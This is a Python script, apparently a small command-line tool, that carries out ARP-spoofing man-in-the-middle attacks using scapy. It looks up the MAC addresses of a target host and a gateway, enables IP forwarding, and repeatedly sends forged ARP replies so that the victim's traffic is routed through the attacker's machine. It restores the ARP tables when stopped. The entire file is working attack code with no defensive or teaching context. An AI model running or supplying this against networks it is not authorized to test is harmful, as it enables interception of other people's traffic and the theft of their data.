import scapy.all as scapy
import subprocess
import time
import argparse


def get_target_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    answered_list= scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
    if answered_list:
        return answered_list[0][1].src
    return None

def spoof (host_ip,host_mac,gateway,gateway_mac):
    packet1 = scapy.ARP(op=2,pdst=host_ip,hwdst=host_mac, psrc=gateway)
    packet2 = scapy.ARP(op=2,pdst=gateway,hwdst=gateway_mac, psrc=host_ip)
    scapy.send(packet1,verbose=False)
    scapy.send(packet2,verbose=False)

def restore(host_ip,host_mac,gateway,gateway_mac):
    packet1 = scapy.ARP(op=2,pdst=host_ip,hwdst=host_mac, psrc=gateway, hwsrc=gateway_mac)
    packet2 = scapy.ARP(op=2,pdst=gateway,hwdst=gateway_mac, psrc=host_ip, hwsrc=host_mac)
    scapy.send(packet1 , verbose=False)
    scapy.send(packet2 , verbose=False)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-g','--gateway', type=str, required=True)
    parser.add_argument('-t','--target', type=str, required=True)
    args = parser.parse_args()
    try:
        p=0
        target_mac = get_target_mac(args.target)
        gateway_mac = get_target_mac(args.gateway)

        subprocess.call('echo 1 > /proc/sys/net/ipv4/ip_forward',shell=True)
        while True:
            spoof(args.target,target_mac,args.gateway,gateway_mac)
            p+=2
            print("\r\033[1;31;40mSending packets ["+ str(p) +"]\033[0m" ,end='')
            time.sleep(3)
    except KeyboardInterrupt:
        subprocess.call('echo 0 > /proc/sys/net/ipv4/ip_forward',shell=True)
        restore(args.target,target_mac,args.gateway,gateway_mac)
        print("\nRestoring order ..")
        print("[+] Spoofing Stopped")

if __name__ == "__main__":
    main()